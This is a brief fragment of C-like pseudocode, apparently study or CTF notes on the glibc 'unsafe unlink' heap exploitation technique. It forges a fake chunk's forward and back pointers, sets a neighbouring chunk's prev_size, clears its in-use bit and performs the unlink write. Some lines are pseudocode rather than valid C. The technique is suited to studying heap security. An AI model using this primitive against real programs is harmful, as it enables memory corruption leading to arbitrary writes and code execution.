fake_chunk = (struct malloc_chunk *)chunk0;
fake_chunk -> F =(struct malloc_chunk *) &chunk0-2;
fake_chunk -> B =(struct malloc_chunk *) &chunk0-3;
fake_chunk -> F -> B == fake_chunk -> B -> F == chunk1_addr

chunk1_hdr = (struct malloc_chunk *)(chunk0-2);
chunk1_hdr->prev_size=0x80;
chunk1_hdr->size &= ~1;

fake_chunk -> F -> B = B;
